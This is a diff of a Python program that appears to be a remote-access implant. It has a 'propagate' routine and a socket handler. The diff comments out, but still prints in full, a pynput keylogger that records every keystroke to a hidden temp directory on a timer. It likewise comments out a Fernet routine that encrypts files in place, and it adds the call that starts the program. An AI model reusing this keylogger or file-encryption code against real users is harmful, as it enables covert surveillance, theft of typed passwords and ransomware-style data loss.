@@ -13,11 +13,11 @@ try:
 	import os # Import os for devnull, remove, mkdir, chdir
 	from sys import exit # Import exit from sys to quit program when specified.
 	from platform import system # Import system from platform to detect os.
-	from pynput import keyboard # Import keyboard to perform keylogger operations.
+	#from pynput import keyboard # Import keyboard to perform keylogger operations.
 	from threading import Timer, Thread # Import Timer to create thread that'll run every 20s.
-	from cryptography.fernet import Fernet # Import Fernet for encryption.
-#except ImportError as e:
- #   print(f'Import error: {e}')
+	# from cryptography.fernet import Fernet # Import Fernet for encryption.
+except ImportError as e:
+    print(f'Import error: {e}')
     
 #""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -132,124 +132,124 @@ def propagate(name: str):
 
 #""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
-def on_press(key):
-	"""This function will handle all the keystrokes a person types into
-	there computer and will store them into a global variable that will
-	be used to write to a file containing all keystrokes.
-		Arguments:
-			key (keyboard obj): holds the keyboard character that was pressed.
-		Returns:
-			None
-	"""
-	global LOG
-	try:
-		LOG += str(key.char) # If key pressed is not a special key, log to file.
-	except AttributeError: # Handling error is key is special key.
-		if key == key.space: # If key is space, append a space to string.
-			LOG += ' '
-		elif key == key.enter: LOG += '\n' # If key is enter, append new line to string.
-		elif key == key.backspace: LOG += '' # If key is backspace, do not append anything.
-		elif key == key.ctrl: LOG += ' ctrl+' # If control key is pressed append string 'ctrl+' followed by key pressed.
-		elif key == key.tab: LOG += '\t' # If tab key is pressed, append tab to string.
-		elif key == key.cmd: LOG += ' cmd+'
-		elif key == key.alt: LOG += ' alt+'
-		elif key == key.caps_lock: LOG += ' CapsLock '
-		elif key == key.delete: LOG += ' Del '
-		elif key == key.down: LOG += ' DownArrow '
-		elif key == key.left: LOG += ' LeftArrow '
-		elif key == key.up: LOG += ' UpArrow '
-		elif key == key.right: LOG += ' RightArrow'
-		elif key == key.esc: LOG += ' esc '
-		elif key == key.home: LOG += ' HomeKey '
-		elif key == key.insert: LOG += ' InsertKey '
-		elif key == key.print_screen: LOG += ' PrintScreen '
-		elif key == key.shift: LOG += ' shift+'
-		elif key == key.f1: LOG += ' F1 '
-		elif key == key.f2: LOG += ' F2 '
-		elif key == key.f3: LOG += ' F3 '
-		elif key == key.f4: LOG += ' F4 '
-		elif key == key.f5: LOG += ' F5 '
-		elif key == key.f6: LOG += ' F6 '
-		elif key == key.f7: LOG += ' F7 '
-		elif key == key.f8: LOG += ' F8 '
-		elif key == key.f9: LOG += ' F9 '
-		elif key == key.f10: LOG += ' F10 '
-		elif key == key.f11: LOG += ' F11 '
-		elif key == key.f12: LOG += ' F12 '
-		else:
-			LOG += str(key) # Append any other special key not handled above.
+# def on_press(key):
+# 	"""This function will handle all the keystrokes a person types into
+# 	there computer and will store them into a global variable that will
+# 	be used to write to a file containing all keystrokes.
+# 		Arguments:
+# 			key (keyboard obj): holds the keyboard character that was pressed.
+# 		Returns:
+# 			None
+# 	"""
+# 	global LOG
+# 	try:
+# 		LOG += str(key.char) # If key pressed is not a special key, log to file.
+# 	except AttributeError: # Handling error is key is special key.
+# 		if key == key.space: # If key is space, append a space to string.
+# 			LOG += ' '
+# 		elif key == key.enter: LOG += '\n' # If key is enter, append new line to string.
+# 		elif key == key.backspace: LOG += '' # If key is backspace, do not append anything.
+# 		elif key == key.ctrl: LOG += ' ctrl+' # If control key is pressed append string 'ctrl+' followed by key pressed.
+# 		elif key == key.tab: LOG += '\t' # If tab key is pressed, append tab to string.
+# 		elif key == key.cmd: LOG += ' cmd+'
+# 		elif key == key.alt: LOG += ' alt+'
+# 		elif key == key.caps_lock: LOG += ' CapsLock '
+# 		elif key == key.delete: LOG += ' Del '
+# 		elif key == key.down: LOG += ' DownArrow '
+# 		elif key == key.left: LOG += ' LeftArrow '
+# 		elif key == key.up: LOG += ' UpArrow '
+# 		elif key == key.right: LOG += ' RightArrow'
+# 		elif key == key.esc: LOG += ' esc '
+# 		elif key == key.home: LOG += ' HomeKey '
+# 		elif key == key.insert: LOG += ' InsertKey '
+# 		elif key == key.print_screen: LOG += ' PrintScreen '
+# 		elif key == key.shift: LOG += ' shift+'
+# 		elif key == key.f1: LOG += ' F1 '
+# 		elif key == key.f2: LOG += ' F2 '
+# 		elif key == key.f3: LOG += ' F3 '
+# 		elif key == key.f4: LOG += ' F4 '
+# 		elif key == key.f5: LOG += ' F5 '
+# 		elif key == key.f6: LOG += ' F6 '
+# 		elif key == key.f7: LOG += ' F7 '
+# 		elif key == key.f8: LOG += ' F8 '
+# 		elif key == key.f9: LOG += ' F9 '
+# 		elif key == key.f10: LOG += ' F10 '
+# 		elif key == key.f11: LOG += ' F11 '
+# 		elif key == key.f12: LOG += ' F12 '
+# 		else:
+# 			LOG += str(key) # Append any other special key not handled above.
 
-def log_to_file():
-	"""This function will log collected keystrokes to a text file in the
-	/tmp folder.
-		Arguments:
-			None
-		Returns:
-			None
-	"""
-	if SYSTEM == 'Linux':
-		f = open(LIN_DIR + 'log.txt', 'w') # Linux: Create and open file 'log.txt' to write captured keystrokes.
-		f.write(LOG) # Write keystrokes to file.
-	else:
-		# f = open(WIN_DIR + 'log.txt', 'w') # Windows: Create and open file 'log.txt' to write captured keystrokes.
-		# f.write(LOG) # Write keystrokes to file.
-	cycle = Timer(SECONDS_TO_LOG, log_to_file) # Set this thread to run every 30 seconds.
-	cycle.start() # Start the time threading operaton.
+# def log_to_file():
+# 	"""This function will log collected keystrokes to a text file in the
+# 	/tmp folder.
+# 		Arguments:
+# 			None
+# 		Returns:
+# 			None
+# 	"""
+# 	if SYSTEM == 'Linux':
+# 		f = open(LIN_DIR + 'log.txt', 'w') # Linux: Create and open file 'log.txt' to write captured keystrokes.
+# 		f.write(LOG) # Write keystrokes to file.
+# 	#else:
+# 		# f = open(WIN_DIR + 'log.txt', 'w') # Windows: Create and open file 'log.txt' to write captured keystrokes.
+# 		# f.write(LOG) # Write keystrokes to file.
+# 	cycle = Timer(SECONDS_TO_LOG, log_to_file) # Set this thread to run every 30 seconds.
+# 	cycle.start() # Start the time threading operaton.
 
-def keylogger():
-	"""This function will start a keylogger in the background.
-		Arguments:
-			None
-		Returns:
-			Confirmation string.
-	"""
-	listener = keyboard.Listener(on_press=on_press) # Creating keystrokes listener object in context manager.
-	try:
-		if SYSTEM == 'Linux':
-			if not os.path.exists(LIN_DIR):
-				os.mkdir(LIN_DIR) # Attempt to create hidden directory in Linux temp folder.
-		# else:
-		# 	if not os.path.exists(WIN_DIR):
-		# 		os.makedirs(WIN_DIR) # Attempt to create hidden direcotry in Windows temp folder.
-		# log_to_file() # Begin thread for logging to file every 30s.
-		# listener.start() # Collent keystrokes until program exit.
-	except OSError: # Ignore os error.
-		pass
+# def keylogger():
+# 	"""This function will start a keylogger in the background.
+# 		Arguments:
+# 			None
+# 		Returns:
+# 			Confirmation string.
+# 	"""
+# 	listener = keyboard.Listener(on_press=on_press) # Creating keystrokes listener object in context manager.
+# 	try:
+# 		if SYSTEM == 'Linux':
+# 			if not os.path.exists(LIN_DIR):
+# 				os.mkdir(LIN_DIR) # Attempt to create hidden directory in Linux temp folder.
+# 		# else:
+# 		# 	if not os.path.exists(WIN_DIR):
+# 		# 		os.makedirs(WIN_DIR) # Attempt to create hidden direcotry in Windows temp folder.
+# 		# log_to_file() # Begin thread for logging to file every 30s.
+# 		# listener.start() # Collent keystrokes until program exit.
+# 	except OSError: # Ignore os error.
+# 		pass
 
 #""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
-def crypto(action: str, *args):
-	"""This function will handle all of our encryption/decryption processes.
-		Argument:
-			action (str): Will take value of encrypt or decrypt.
-			request (list): A list containing file name or file and decryption key if action eq decrypt.
-		Returns:
-			Confirmation string.
-	"""
-	if action == 'encrypt':
-		to_encrypt = args[0]
-		with open(to_encrypt, 'wb+') as f:
-			data = f.read()
-			key = Fernet.generate_key()
-			cipher = Fernet(key)
-			cipher_text = cipher.encrypt(data)
-			f.seek(0)
-			f.write(cipher_text)
-			f.truncate()
-			return f'  Save this key -> {key.decode()}'
-	else:
-		to_encrypt, key = args[0][0], args[0][1]
-		with open(to_encrypt, 'wb+') as f:
-			cipher_text = f.read()
-			cipher = Fernet(key)
-			try:
-				plain_text = cipher.decrypt(cipher_text)
-			except cryptography.fernet.InvalidToken:
-				return '  [-] Invalid key!'
-			f.seek(0)
-			f.write(plain_text)
-			f.truncate()
-			return '  [+] File successfully decrypted!'
+# def crypto(action: str, *args):
+	# """This function will handle all of our encryption/decryption processes.
+	# 	Argument:
+	# 		action (str): Will take value of encrypt or decrypt.
+	# 		request (list): A list containing file name or file and decryption key if action eq decrypt.
+	# 	Returns:
+	# 		Confirmation string.
+	# """
+	# if action == 'encrypt':
+	# 	to_encrypt = args[0]
+	# 	with open(to_encrypt, 'wb+') as f:
+	# 		data = f.read()
+	# 		key = Fernet.generate_key()
+	# 		cipher = Fernet(key)
+	# 		cipher_text = cipher.encrypt(data)
+	# 		f.seek(0)
+	# 		f.write(cipher_text)
+	# 		f.truncate()
+	# 		return f'  Save this key -> {key.decode()}'
+	# else:
+	# 	to_encrypt, key = args[0][0], args[0][1]
+	# 	with open(to_encrypt, 'wb+') as f:
+	# 		cipher_text = f.read()
+	# 		cipher = Fernet(key)
+	# 		try:
+	# 			plain_text = cipher.decrypt(cipher_text)
+	# 		except cryptography.fernet.InvalidToken:
+	# 			return '  [-] Invalid key!'
+	# 		f.seek(0)
+	# 		f.write(plain_text)
+	# 		f.truncate()
+	# 		return '  [+] File successfully decrypted!'
 
 #""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -390,3 +390,4 @@ def main():
 	obj.handle_request() # Will invoke function that will handle all socket connection operations.
 
 if __name__ == '__main__':
+	main()
